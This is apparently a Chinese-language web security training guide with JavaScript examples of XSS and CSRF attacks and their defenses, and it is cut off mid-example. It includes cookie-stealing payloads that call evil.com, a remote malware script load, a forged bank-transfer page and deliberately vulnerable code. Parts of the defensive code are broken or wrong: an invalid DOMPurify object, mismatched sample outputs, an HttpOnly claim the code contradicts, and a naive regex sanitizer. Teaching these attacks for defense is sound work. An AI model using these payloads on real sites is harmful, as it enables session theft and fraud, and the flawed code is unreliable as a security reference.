# Web 安全专项 — 完整攻防指南

> 专项训练 13:00 | 2026-04-25
> 主题: XSS / CSRF / 输入净化 / 内容安全策略 (CSP) / 安全代码示例 + 攻防演练

---

## 目录

1. [XSS 攻击与防御](#1-xss-攻击与防御)
2. [CSRF 攻击与防御](#2-csrf-攻击与防御)
3. [输入净化 (Sanitization)](#3-输入净化-sanitization)
4. [内容安全策略 (CSP)](#4-内容安全策略-csp)
5. [综合安全架构](#5-综合安全架构)
6. [攻防演练实验室](#6-攻防演练实验室)
7. [安全审计清单](#7-安全审计清单)

---

## 1. XSS 攻击与防御

### 1.1 XSS 三种类型全景

```js
// --- File: src/security/xss-types.js ---

/**
 * XSS 三种类型：
 *
 * 1. Stored (持久型): 恶意脚本存入服务器 → 所有访问者受害
 *    例: 论坛帖子、评论区、用户资料
 *
 * 2. Reflected (反射型): 恶意脚本通过 URL 参数传入 → 服务器反射回页面
 *    例: 搜索结果页、错误消息页
 *
 * 3. DOM-based (DOM 型): 恶意脚本通过 JS DOM 操作执行，不经过服务器
 *    例: location.hash 读取、innerHTML 赋值
 */

// ==================== Stored XSS 攻击示例 ====================

/**
 * ❌ 危险：直接将用户输入存入数据库并渲染
 *
 * 攻击流程:
 * 1. 攻击者在评论区提交: <img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
 * 2. 服务器原样存入数据库
 * 3. 任何用户访问该页面，脚本自动执行
 * 4. 攻击者获取所有访问者的 Cookie
 */
const storedXssVulnerable = {
  // 后端：直接存入
  saveComment(userId, comment) {
    // ❌ 危险：未做任何处理
    db.run('INSERT INTO comments VALUES (?, ?)', [userId, comment]);
  },

  // 前端：直接渲染
  renderComments(comments) {
    const container = document.getElementById('comments');
    comments.forEach((c) => {
      // ❌ 危险：innerHTML 执行脚本
      container.innerHTML += `<div class="comment">${c.content}</div>`;
    });
  },
};

// ==================== Reflected XSS 攻击示例 ====================

/**
 * ❌ 危险：URL 参数直接反射到页面
 *
 * 攻击流程:
 * 1. 攻击者构造恶意链接:
 *    https://example.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
 * 2. 诱骗用户点击
 * 3. 服务器将 q 参数原样嵌入搜索结果页
 * 4. 用户浏览器执行脚本
 */
const reflectedXssVulnerable = {
  // 后端模板渲染
  renderSearchPage(query) {
    // ❌ 危险：模板中未转义
    return `
      <html>
        <body>
          <h1>搜索结果: ${query}</h1>  <!-- ❌ 直接插入 -->
          <p>您搜索了: ${query}</p>
        </body>
      </html>
    `;
  },

  // Express 路由
  handleSearch(req, res) {
    const query = req.query.q;
    // ❌ 危险：直接拼接 HTML
    res.send(`<h1>搜索结果: ${query}</h1>`);
  },
};

// ==================== DOM-based XSS 攻击示例 ====================

/**
 * ❌ 危险：从 URL 读取数据直接操作 DOM
 *
 * 攻击流程:
 * 1. 攻击者构造: https://example.com/page#<img src=x onerror=alert(1)>
 * 2. 页面 JS 读取 location.hash 并插入 DOM
 * 3. 脚本执行（无需服务器参与！）
 */
const domBasedXssVulnerable = {
  init() {
    // ❌ 危险：从 hash 读取并直接插入
    const hash = decodeURIComponent(location.hash.slice(1));
    document.getElementById('content').innerHTML = hash;

    // ❌ 危险：从 URL 参数读取
    const params = new URLSearchParams(location.search);
    const name = params.get('name');
    document.write(`<h1>欢迎, ${name}!</h1>`);

    // ❌ 危险：eval location 数据
    const action = location.hash.slice(1);
    eval(action);

    // ❌ 危险：动态创建脚本
    const script = document.createElement('script');
    script.src = location.search.slice(1); // ?https://evil.com/malware.js
    document.head.appendChild(script);
  },
};

// ==================== XSS 攻击向量大全 ====================

/**
 * XSS 注入点完整清单
 * 每个注入点都需要不同的防御策略
 */
const XSSVectors = {
  // 1. HTML 内容注入
  htmlContent: {
    // ❌ 危险
    attack: `<script>alert('xss')</script>`,
    safe: `<script>alert(&#39;xss&#39;)<\/script>`, // HTML 实体编码
  },

  // 2. HTML 属性注入
  attribute: {
    // ❌ 危险（闭合属性 + 注入事件）
    attack: `" onmouseover="alert('xss')" data-x="`,
    safe: `&quot; onmouseover=&quot;alert(&#39;xss&#39;)&quot; data-x=&quot;`,
  },

  // 3. JavaScript 字符串注入
  jsString: {
    // ❌ 危险（闭合 JS 字符串）
    attack: `'; alert('xss'); //`,
    // 需要 JS 字符串编码，不仅仅是 HTML 实体
    safe: `\\'; alert(\\'xss\\'); //`,
  },

  // 4. URL 注入
  url: {
    // ❌ 危险（javascript: 协议）
    attack: `javascript:alert('xss')`,
    // 需要 URL 白名单验证
    safe: `https://example.com/page`,
  },

  // 5. CSS 注入
  css: {
    // ❌ 危险（expression 在旧 IE 中执行 JS）
    attack: `expression(alert('xss'))`,
    // 需要 CSS 编码
    safe: `expression\\28 alert\\28 'xss' \\29 \\29`,
  },

  // 6. 事件处理器注入
  eventHandler: {
    // ❌ 危险
    attack: `<div onclick="alert('xss')">`,
    // 需要完全移除事件处理器属性
    safe: `<div>`,
  },

  // 7. SVG 注入
  svg: {
    // ❌ 危险
    attack: `<svg onload="alert('xss')">`,
    safe: `&lt;svg onload=&quot;alert(&#39;xss&#39;)&quot;&gt;`,
  },

  // 8. iframe 注入
  iframe: {
    // ❌ 危险
    attack: `<iframe src="javascript:alert('xss')">`,
    safe: ``, // 最佳策略：完全禁止 iframe
  },
};

// ==================== XSS 防御：HTML 实体编码 ====================

/**
 * ✅ 防御核心：根据上下文选择正确的编码方式
 *
 * 编码规则表:
 * ┌──────────────┬─────────────────────────────────────┐
 * │ 上下文        │ 编码方式                           │
 * ├──────────────┼─────────────────────────────────────┤
 * │ HTML 内容     │ HTML 实体编码                      │
 * │ HTML 属性值   │ HTML 实体编码 + 引号转义            │
 * │ JavaScript    │ JS 字符串编码                      │
 * │ URL 参数      │ URL 编码 (encodeURIComponent)       │
 * │ CSS           │ CSS 编码                           │
 * └──────────────┴─────────────────────────────────────┘
 */

/**
 * HTML 实体编码 — 防御 HTML 内容和属性注入
 */
function htmlEncode(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

/**
 * JavaScript 字符串编码 — 防御 JS 上下文注入
 */
function jsEncode(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[^\w]/g, (char) => {
    const code = char.charCodeAt(0);
    if (code < 256) {
      return `\\x${code.toString(16).padStart(2, '0')}`;
    }
    return `\\u${code.toString(16).padStart(4, '0')}`;
  });
}

/**
 * URL 编码 — 防御 URL 上下文注入
 */
function urlEncode(str) {
  if (typeof str !== 'string') return '';
  return encodeURIComponent(str);
}

/**
 * CSS 编码 — 防御 CSS 上下文注入
 */
function cssEncode(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[^\w-]/g, (char) => {
    const code = char.charCodeAt(0);
    return `\\${code.toString(16)} `;
  });
}

// ==================== XSS 防御：安全 DOM 操作 ====================

/**
 * ✅ 安全 DOM 操作 — 永远不要用 innerHTML 插入不可信数据
 */
const SafeDOM = {
  /**
   * 安全设置文本内容（自动转义）
   */
  setText(element, text) {
    element.textContent = text; // ✅ textContent 自动转义
  },

  /**
   * 安全创建元素
   */
  createElement(tag, textContent, attributes = {}) {
    const el = document.createElement(tag);
    if (textContent !== undefined) {
      el.textContent = textContent; // ✅ 使用 textContent
    }
    for (const [key, value] of Object.entries(attributes)) {
      // ✅ 使用 setAttribute（比直接赋值属性安全）
      if (key.startsWith('on')) {
        // ❌ 禁止动态设置事件处理器
        console.warn(`Blocked event handler: ${key}`);
        continue;
      }
      el.setAttribute(key, value);
    }
    return el;
  },

  /**
   * 安全模板渲染
   */
  renderTemplate(template, data) {
    // ✅ 使用 DOMParser 解析模板，然后安全填充
    const parser = new DOMParser();
    const doc = parser.parseFromString(template, 'text/html');

    for (const [key, value] of Object.entries(data)) {
      const placeholders = doc.querySelectorAll(`[data-bind="${key}"]`);
      placeholders.forEach((el) => {
        el.textContent = String(value); // ✅ 使用 textContent
      });
    }

    return doc.body.innerHTML;
  },

  /**
   * 安全 URL 设置（验证协议白名单）
   */
  setHref(element, url) {
    const allowedProtocols = ['http:', 'https:', 'mailto:', 'tel:'];
    try {
      const parsed = new URL(url, location.href);
      if (allowedProtocols.includes(parsed.protocol)) {
        element.href = url; // ✅ 协议白名单验证通过
      } else {
        console.warn(`Blocked URL protocol: ${parsed.protocol}`);
        element.href = '#';
      }
    } catch {
      console.warn('Invalid URL');
      element.href = '#';
    }
  },
};

// ==================== XSS 防御：CSP 头配置 ====================

/**
 * ✅ CSP 是 XSS 的最后一道防线
 * 即使攻击者注入了脚本，CSP 也能阻止执行
 */
const CSPHeaders = {
  // 严格 CSP — 推荐生产环境使用
  strict: `
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self';
    connect-src 'self';
    frame-src 'none';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;
  `.replace(/\s+/g, ' ').trim(),

  // 宽松 CSP — 开发环境
  development: `
    default-src 'self' 'unsafe-inline' 'unsafe-eval';
  `.replace(/\s+/g, ' ').trim(),

  // 仅报告模式 — 迁移期使用
  reportOnly: `
    default-src 'self';
    script-src 'self';
    report-uri /csp-report;
  `.replace(/\s+/g, ' ').trim(),
};

// ==================== XSS 防御：输入验证 + 输出编码 ====================

/**
 * ✅ 纵深防御：输入验证 + 输出编码 + CSP
 * 三层防护，缺一不可
 */
class XSSDefense {
  constructor() {
    // 输入验证规则
    this.validators = {
      username: (v) => /^[a-zA-Z0-9_]{3,20}$/.test(v),
      email: (v) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v),
      url: (v) => {
        try {
          const url = new URL(v);
          return ['http:', 'https:'].includes(url.protocol);
        } catch {
          return false;
        }
      },
      number: (v) => !isNaN(Number(v)) && isFinite(Number(v)),
    };
  }

  /**
   * 输入验证（第一道防线）
   */
  validate(field, value) {
    const validator = this.validators[field];
    if (!validator) return true; // 无规则则放行
    return validator(value);
  }

  /**
   * 输出编码（第二道防线）
   */
  encode(context, value) {
    const str = String(value);
    switch (context) {
      case 'html':
        return htmlEncode(str);
      case 'js':
        return jsEncode(str);
      case 'url':
        return urlEncode(str);
      case 'css':
        return cssEncode(str);
      case 'attribute':
        return htmlEncode(str); // 属性值也用 HTML 编码
      default:
        return htmlEncode(str);
    }
  }

  /**
   * 安全渲染（综合防御）
   */
  safeRender(template, data, contextMap) {
    return template.replace(/\{(\w+)\}/g, (_, key) => {
      const context = contextMap[key] || 'html';
      const value = data[key] ?? '';
      return this.encode(context, value);
    });
  }
}

// 使用示例
const defense = new XSSDefense();

// 输入验证
console.log(defense.validate('username', 'alice123')); // true
console.log(defense.validate('username', '<script>')); // false
console.log(defense.validate('email', 'test@example.com')); // true

// 输出编码
console.log(defense.encode('html', '<script>alert(1)</script>'));
// → &lt;script&gt;alert(1)&lt;/script&gt;

console.log(defense.encode('js', "'; alert('xss'); //"));
// → \\x27\\x3b alert(\\x27xss\\x27)\\x3b \\x2f\\x2f

// 安全模板渲染
const result = defense.safeRender(
  '<h1>{title}</h1><p>{content}</p><a href="{link}">Link</a>',
  {
    title: '<b>Hello</b>',
    content: '<script>alert(1)</script>',
    link: 'javascript:alert(1)',
  },
  { title: 'html', content: 'html', link: 'url' }
);
console.log(result);
// → <h1>&lt;b&gt;Hello&lt;/b&gt;</h1><p>&lt;script&gt;alert(1)&lt;/script&gt;</p><a href="javascript:alert(1)">Link</a>

// ==================== XSS 攻防演练 ====================

/**
 * 演练 1: Stored XSS 攻击与防御
 */
const Exercise1 = {
  // 攻击者视角
  attack() {
    const maliciousComment =
      '<img src=x onerror="fetch(`https://evil.com/steal?cookie=${document.cookie}`)">';

    // ❌ 漏洞代码
    function vulnerableSave(comment) {
      db.run('INSERT INTO comments (content) VALUES (?)', [comment]);
    }

    function vulnerableRender(comments) {
      const container = document.getElementById('comments');
      container.innerHTML = comments
        .map((c) => `<div class="comment">${c.content}</div>`)
        .join('');
    }

    return { maliciousComment, vulnerableSave, vulnerableRender };
  },

  // 防御者视角
  defend() {
    // ✅ 防御 1: 输入净化
    function sanitizeInput(comment) {
      return comment
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }

    // ✅ 防御 2: 安全渲染
    function safeRender(comments) {
      const container = document.getElementById('comments');
      comments.forEach((c) => {
        const div = document.createElement('div');
        div.className = 'comment';
        div.textContent = c.content; // ✅ textContent 自动转义
        container.appendChild(div);
      });
    }

    // ✅ 防御 3: CSP 头
    // Content-Security-Policy: default-src 'self'; script-src 'self'

    return { sanitizeInput, safeRender };
  },
};

/**
 * 演练 2: DOM-based XSS 攻击与防御
 */
const Exercise2 = {
  attack() {
    // 攻击者构造恶意 URL
    const maliciousUrl =
      'https://example.com/page#<img src=x onerror=alert(document.cookie)>';

    // ❌ 漏洞代码
    function vulnerableInit() {
      const hash = decodeURIComponent(location.hash.slice(1));
      document.getElementById('content').innerHTML = hash;
    }

    return { maliciousUrl, vulnerableInit };
  },

  defend() {
    // ✅ 防御: 永远不要将 URL 数据直接插入 DOM
    function safeInit() {
      const hash = decodeURIComponent(location.hash.slice(1));
      const content = document.getElementById('content');

      // ✅ 方案 1: 使用 textContent
      content.textContent = hash;

      // ✅ 方案 2: 如果必须解析 HTML，使用 DOMPurify
      // content.innerHTML = DOMPurify.sanitize(hash);
    }

    return { safeInit };
  },
};

```

---

## 2. CSRF 攻击与防御

### 2.1 CSRF 攻击原理

```js
// --- File: src/security/csrf.js ---

/**
 * CSRF (Cross-Site Request Forgery) 攻击原理:
 *
 * 1. 用户在银行网站登录（浏览器持有有效 Cookie）
 * 2. 用户访问恶意网站 evil.com
 * 3. 恶意网站自动向银行网站发起请求
 * 4. 浏览器自动附带银行网站的 Cookie
 * 5. 银行网站误以为是用户本人操作
 *
 * 关键: CSRF 利用的是浏览器自动发送 Cookie 的机制
 * 攻击者不需要知道 Cookie 内容，只需要触发请求
 */

// ==================== CSRF 攻击示例 ====================

/**
 * ❌ 危险：没有 CSRF 保护的转账接口
 *
 * 攻击者可以在恶意网站中嵌入:
 */
const csrfAttackPage = `
<!DOCTYPE html>
<html>
<body>
  <!-- 攻击 1: 自动提交的表单 -->
  <form id="csrf-form" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="10000">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>

  <!-- 攻击 2: 图片标签触发 GET 请求 -->
  <!-- 如果银行用 GET 做转账，这就是漏洞 -->
  <img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none">

  <!-- 攻击 3: Fetch 请求（同站 Cookie 策略宽松时） -->
  <script>
    fetch('https://bank.com/transfer', {
      method: 'POST',
      credentials: 'include', // 浏览器自动附带 Cookie
      body: 'to=attacker&amount=10000'
    });
  </script>
</body>
</html>
`;

// ==================== CSRF 防御 1: SameSite Cookie ====================

/**
 * ✅ SameSite Cookie — 第一道防线
 *
 * SameSite 属性控制 Cookie 是否随跨站请求发送:
 * - Strict: 完全不发送（最安全，可能影响用户体验）
 * - Lax: 仅顶级导航（GET）发送，POST/AJAX 不发送（推荐）
 * - None: 始终发送（需要 Secure 标志）
 *
 * 浏览器支持: Chrome 51+, Firefox 69+, Safari 13+
 */
const SameSiteDefense = {
  /**
   * Express 中设置 SameSite Cookie
   */
  setupExpressSession(app) {
    const session = require('express-session');
    app.use(
      session({
        secret: 'your-secret-key',
        cookie: {
          sameSite: 'lax', // ✅ 推荐 Lax
          secure: true, // ✅ 仅 HTTPS
          httpOnly: true, // ✅ 禁止 JS 访问
          maxAge: 24 * 60 * 60 * 1000,
        },
      })
    );
  },

  /**
   * 手动设置 Cookie
   */
  setCookie(res, name, value) {
    res.setHeader(
      'Set-Cookie',
      `${name}=${value}; HttpOnly; Secure; SameSite=Lax; Path=/`
    );
  },
};

// ==================== CSRF 防御 2: Token 验证 ====================

/**
 * ✅ CSRF Token — 最可靠的防御方式
 *
 * 原理:
 * 1. 服务器生成随机 Token，存入 Session
 * 2. 表单中嵌入 Token（隐藏字段）
 * 3. 提交时服务器验证 Token 是否匹配
 * 4. 攻击者无法获取 Token（同源策略保护）
 */
const CSRFToken = {
  /**
   * 生成 CSRF Token
   */
  generate() {
    const crypto = require('crypto');
    return crypto.randomBytes(32).toString('hex');
  },

  /**
   * Express 中间件：生成并验证 Token
   */
  middleware() {
    const crypto = require('crypto');

    return (req, res, next) => {
      // 生成 Token（如果不存在）
      if (!req.session.csrfToken) {
        req.session.csrfToken = crypto.randomBytes(32).toString('hex');
      }

      // 将 Token 暴露给模板
      res.locals.csrfToken = req.session.csrfToken;

      // 验证非安全方法的请求
      const unsafeMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];
      if (unsafeMethods.includes(req.method)) {
        const token =
          req.body._csrf ||
          req.headers['x-csrf-token'] ||
          req.query._csrf;

        if (!token || token !== req.session.csrfToken) {
          return res.status(403).json({ error: 'Invalid CSRF token' });
        }
      }

      next();
    };
  },

  /**
   * 模板中使用 Token
   */
  templateForm(csrfToken) {
    return `
      <form action="/transfer" method="POST">
        <input type="hidden" name="_csrf" value="${csrfToken}">
        <input type="text" name="to" placeholder="收款账户">
        <input type="number" name="amount" placeholder="金额">
        <button type="submit">转账</button>
      </form>
    `;
  },

  /**
   * AJAX 请求中携带 Token
   */
  fetchWithCSRF(url, options = {}) {
    const token = document.querySelector('meta[name="csrf-token"]')?.content;
    return fetch(url, {
      ...options,
      credentials: 'same-origin',
      headers: {
        ...options.headers,
        'Content-Type': 'application/json',
        'x-csrf-token': token || '',
      },
    });
  },
};

// ==================== CSRF 防御 3: Origin/Referer 验证 ====================

/**
 * ✅ Origin/Referer 验证 — 补充防御
 *
 * 检查请求来源，拒绝跨站请求
 * 注意: Referer 可能被代理服务器或浏览器设置移除
 */
const OriginDefense = {
  /**
   * Express 中间件：验证 Origin/Referer
   */
  middleware(allowedOrigins = []) {
    return (req, res, next) => {
      const unsafeMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];
      if (!unsafeMethods.includes(req.method)) {
        return next();
      }

      const origin = req.headers.origin || req.headers.referer;
      if (!origin) {
        return res.status(403).json({ error: 'Missing Origin header' });
      }

      const originHost = new URL(origin).hostname;
      const isAllowed = allowedOrigins.some(
        (allowed) =>
          originHost === new URL(allowed).hostname ||
          originHost.endsWith('.' + new URL(allowed).hostname)
      );

      if (!isAllowed) {
        return res.status(403).json({ error: 'Invalid origin' });
      }

      next();
    };
  },
};

// ==================== CSRF 防御 4: Double Submit Cookie ====================

/**
 * ✅ Double Submit Cookie — 无状态 CSRF 防御
 *
 * 原理:
 * 1. 服务器设置一个随机 Cookie (XSRF-TOKEN)
 * 2. 客户端读取 Cookie，在请求头中发送相同值
 * 3. 服务器比较 Cookie 值和请求头值
 * 4. 攻击者无法读取 Cookie（HttpOnly），但浏览器会自动发送
 *    攻击者也无法设置请求头（同源策略）
 *
 * 优势: 不需要服务端存储 Token，适合无状态架构
 */
const DoubleSubmitDefense = {
  /**
   * 设置 CSRF Cookie
   */
  init(res) {
    const crypto = require('crypto');
    const token = crypto.randomBytes(32).toString('hex');
    res.cookie('XSRF-TOKEN', token, {
      httpOnly: false, // 需要 JS 读取
      secure: true,
      sameSite: 'lax',
    });
    return token;
  },

  /**
   * 验证中间件
   */
  middleware() {
    return (req, res, next) => {
      const unsafeMethods = ['POST', 'PUT', 'PATCH', 'DELETE'];
      if (!unsafeMethods.includes(req.method)) {
        return next();
      }

      const cookieToken = req.cookies['XSRF-TOKEN'];
      const headerToken = req.headers['x-xsrf-token'];

      if (!cookieToken || !headerToken || cookieToken !== headerToken) {
        return res.status(403).json({ error: 'Invalid CSRF token' });
      }

      next();
    };
  },

  /**
   * 客户端自动携带 Token
   */
  setupAxiosInterceptor(axiosInstance) {
    axiosInstance.interceptors.request.use((config) => {
      const token = document.cookie
        .split('; ')
        .find((row) => row.startsWith('XSRF-TOKEN='))
        ?.split('=')[1];
      if (token) {
        config.headers['x-xsrf-token'] = token;
      }
      return config;
    });
  },
};

// ==================== CSRF 攻防演练 ====================

/**
 * 演练: CSRF 攻击与完整防御
 */
const CSRFExercise = {
  // 攻击者视角
  attack() {
    // 恶意页面
    const evilPage = `
      <form action="https://bank.com/api/transfer" method="POST" id="attack">
        <input name="to" value="attacker">
        <input name="amount" value="999999">
      </form>
      <script>document.getElementById('attack').submit()</script>
    `;

    // 成功条件:
    // 1. 用户在银行网站已登录（有有效 Cookie）
    // 2. 银行接口没有 CSRF 保护
    // 3. 用户访问了恶意页面

    return { evilPage, successConditions: ['valid_cookie', 'no_csrf_protection', 'user_visits_evil'] };
  },

  // 防御者视角 — 纵深防御
  defend() {
    return {
      layer1: 'SameSite=Lax Cookie（阻止大部分跨站请求）',
      layer2: 'CSRF Token（表单/AJAX 必须携带有效 Token）',
      layer3: 'Origin 验证（检查请求来源）',
      layer4: 'Double Submit Cookie（无状态 Token 验证）',
      layer5: '二次确认（敏感操作要求密码/验证码）',
    };
  },
};

```

---

## 3. 输入净化 (Sanitization)

### 3.1 输入净化策略

```js
// --- File: src/security/sanitization.js ---

/**
 * 输入净化原则:
 * 1. 白名单 > 黑名单（允许已知的安全内容，拒绝其他）
 * 2. 上下文感知（HTML/JS/URL/CSS 需要不同的净化策略）
 * 3. 纵深防御（净化 + 编码 + CSP 多层保护）
 * 4. 默认拒绝（不确定时，拒绝输入）
 */

// ==================== HTML 净化器 ====================

/**
 * 轻量级 HTML 净化器 — 白名单标签 + 白名单属性
 *
 * 生产环境推荐使用 DOMPurify，这里实现简化版用于学习
 */
class HTMLSanitizer {
  constructor(options = {}) {
    // 白名单标签
    this.allowedTags = new Set(options.allowedTags || [
      'p', 'br', 'strong', 'em', 'b', 'i', 'u', 's',
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'ul', 'ol', 'li',
      'a', 'img',
      'blockquote', 'pre', 'code',
      'table', 'thead', 'tbody', 'tr', 'th', 'td',
      'div', 'span',
    ]);

    // 白名单属性
    this.allowedAttrs = new Set(options.allowedAttrs || [
      'href', 'src', 'alt', 'title', 'class',
      'width', 'height', 'colspan', 'rowspan',
    ]);

    // 白名单 URL 协议
    this.allowedProtocols = new Set(options.allowedProtocols || [
      'http:', 'https:', 'mailto:', 'tel:',
    ]);

    // 是否移除注释
    this.removeComments = options.removeComments !== false;
  }

  /**
   * 净化 HTML 字符串
   */
  sanitize(html) {
    if (typeof html !== 'string') return '';

    let cleaned = html;

    // 1. 移除注释
    if (this.removeComments) {
      cleaned = cleaned.replace(/<!--[\s\S]*?-->/g, '');
    }

    // 2. 移除 script 标签及其内容
    cleaned = cleaned.replace(/<script[\s\S]*?<\/script>/gi, '');

    // 3. 移除事件处理器
    cleaned = cleaned.replace(/\s+on\w+\s*=\s*["'][\s\S]*?["']/gi, '');
    cleaned = cleaned.replace(/\s+on\w+\s*=\s*\S+/gi, '');

    // 4. 移除 javascript: 协议
    cleaned = cleaned.replace(/javascript\s*:/gi, '');

    // 5. 移除 data: 协议（可能被用于 XSS）
    cleaned = cleaned.replace(/data\s*:/gi, '');

    // 6. 移除 vbscript: 协议（IE 遗留）
    cleaned = cleaned.replace(/vbscript\s*:/gi, '');

    // 7. 移除 expression()（IE CSS 注入）
    cleaned = cleaned.replace(/expression\s*\(/gi, '');

    return cleaned;
  }

  /**
   * 严格模式：只保留白名单标签
   */
  sanitizeStrict(html) {
    if (typeof html !== 'string') return '';

    return html.replace(/<([^>]+)>/g, (_, tagContent) => {
      // 解析标签名
      const tagNameMatch = tagContent.match(/^\/?(\w+)/);
      if (!tagNameMatch) return '';

      const tagName = tagNameMatch[1].toLowerCase();

      // 检查白名单
      if (!this.allowedTags.has(tagName)) {
        return ''; // 移除非白名单标签
      }

      // 过滤属性
      const attrs = this.filterAttributes(tagContent);
      const closing = tagContent.startsWith('/') ? '/' : '';
      return `<${closing}${tagName}${attrs}>`;
    });
  }

  /**
   * 过滤属性（白名单）
   */
  filterAttributes(tagContent) {
    const attrRegex = /(\w+)\s*=\s*["']([^"']*?)["']/g;
    let result = '';
    let match;

    while ((match = attrRegex.exec(tagContent)) !== null) {
      const [, attrName, attrValue] = match;

      // 检查属性白名单
      if (!this.allowedAttrs.has(attrName.toLowerCase())) {
        continue;
      }

      // 特殊处理 href/src — 验证 URL 协议
      if (attrName.toLowerCase() === 'href' || attrName.toLowerCase() === 'src') {
        if (!this.isValidUrl(attrValue)) {
          continue;
        }
      }

      result += ` ${attrName}="${this.htmlEncode(attrValue)}"`;
    }

    return result;
  }

  /**
   * 验证 URL 协议
   */
  isValidUrl(url) {
    try {
      const parsed = new URL(url, 'http://placeholder.com');
      return this.allowedProtocols.has(parsed.protocol);
    } catch {
      // 相对路径允许
      return !url.toLowerCase().includes('javascript:');
    }
  }

  /**
   * HTML 实体编码
   */
  htmlEncode(str) {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }
}

// ==================== 富文本净化（DOMPurify 风格） ====================

/**
 * 生产环境推荐方案：DOMPurify
 * 这里模拟其核心 API
 */
const DOMPurify = {
  /**
   * 净化 HTML — 生产环境使用真正的 DOMPurify
   * npm install dompurify
   */
  sanitize(html, config = {}) {
    // 模拟 DOMPurify 的行为
    const sanitizer = new HTMLSanitizer(config);
    return sanitizer.sanitize(html);
  },

  /**
   * 添加自定义白名单标签
   */
  addHook('beforeSanitizeElements', (node) => {
    // 自定义净化逻辑
  }),
};

// ==================== 输入净化中间件 ====================

/**
 * Express 输入净化中间件
 */
const SanitizationMiddleware = {
  /**
   * 净化请求体中的所有字符串字段
   */
  body() {
    return (req, res, next) => {
      if (req.body && typeof req.body === 'object') {
        req.body = this.sanitizeObject(req.body);
      }
      next();
    };
  },

  /**
   * 净化查询参数
   */
  query() {
    return (req, res, next) => {
      if (req.query && typeof req.query === 'object') {
        req.query = this.sanitizeObject(req.query);
      }
      next();
    };
  },

  /**
   * 递归净化对象
   */
  sanitizeObject(obj) {
    if (typeof obj === 'string') {
      return obj
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
    }
    if (Array.isArray(obj)) {
      return obj.map((item) => this.sanitizeObject(item));
    }
    if (obj && typeof obj === 'object') {
      const result = {};
      for (const [key, value] of Object.entries(obj)) {
        // 净化键名
        const safeKey = key.replace(/[^\w.-]/g, '');
        result[safeKey] = this.sanitizeObject(value);
      }
      return result;
    }
    return obj;
  },
};

// ==================== 输入验证 + 净化组合 ====================

/**
 * 完整的输入处理管道:
 * 验证 → 净化 → 类型转换 → 业务逻辑
 */
class InputPipeline {
  constructor() {
    this.sanitizer = new HTMLSanitizer();
  }

  /**
   * 字符串字段处理
   */
  string(options = {}) {
    const {
      required = false,
      minLength = 0,
      maxLength = Infinity,
      trim = true,
      sanitize = true,
      pattern = null,
    } = options;

    return (value) => {
      // 1. 空值检查
      if (value === undefined || value === null) {
        return required ? { error: 'Field is required' } : { value: undefined };
      }

      let result = String(value);

      // 2. 去除空白
      if (trim) result = result.trim();

      // 3. 净化
      if (sanitize) result = this.sanitizer.sanitize(result);

      // 4. 长度检查
      if (result.length < minLength) {
        return { error: `Minimum length is ${minLength}` };
      }
      if (result.length > maxLength) {
        return { error: `Maximum length is ${maxLength}` };
      }

      // 5. 模式匹配
      if (pattern && !pattern.test(result)) {
        return { error: 'Does not match required pattern' };
      }

      return { value: result };
    };
  }

  /**
   * 邮箱字段处理
   */
  email(options = {}) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const stringHandler = this.string({
      ...options,
      maxLength: 254,
      pattern: emailRegex,
    });
    return (value) => {
      const result = stringHandler(value);
      if (result.value) result.value = result.value.toLowerCase();
      return result;
    };
  }

  /**
   * 数字字段处理
   */
  number(options = {}) {
    const {
      required = false,
      min = -Infinity,
      max = Infinity,
      integer = false,
    } = options;

    return (value) => {
      if (value === undefined || value === null) {
        return required ? { error: 'Field is required' } : { value: undefined };
      }

      const num = Number(value);
      if (isNaN(num)) return { error: 'Must be a number' };
      if (!isFinite(num)) return { error: 'Must be a finite number' };
      if (integer && !Number.isInteger(num)) return { error: 'Must be an integer' };
      if (num < min) return { error: `Minimum value is ${min}` };
      if (num > max) return { error: `Maximum value is ${max}` };

      return { value: num };
    };
  }

  /**
   * URL 字段处理
   */
  url(options = {}) {
    const stringHandler = this.string({ ...options, sanitize: false });
    return (value) => {
      const result = stringHandler(value);
      if (!result.value) return result;

      try {
        const parsed = new URL(result.value);
        if (!['http:', 'https:'].includes(parsed.protocol)) {
          return { error: 'Only HTTP and HTTPS protocols allowed' };
        }
        return { value: parsed.href };
      } catch {
        return { error: 'Invalid URL' };
      }
    };
  }

  /**
   * 对象验证
   */
  validate(schema, data) {
    const result = { valid: true, data: {}, errors: {} };

    for (const [key, handler] of Object.entries(schema)) {
      const fieldResult = handler(data[key]);
      if (fieldResult.error) {
        result.valid = false;
        result.errors[key] = fieldResult.error;
      } else {
        result.data[key] = fieldResult.value;
      }
    }

    return result;
  }
}

// 使用示例
const pipeline = new InputPipeline();

const userSchema = {
  username: pipeline.string({ required: true, minLength: 3, maxLength: 20, pattern: /^[a-zA-Z0-9_]+$/ }),
  email: pipeline.email({ required: true }),
  age: pipeline.number({ min: 0, max: 150, integer: true }),
  website: pipeline.url(),
  bio: pipeline.string({ maxLength: 500, sanitize: true }),
};

const validationResult = pipeline.validate(userSchema, {
  username: 'alice123',
  email: 'alice@example.com',
  age: 25,
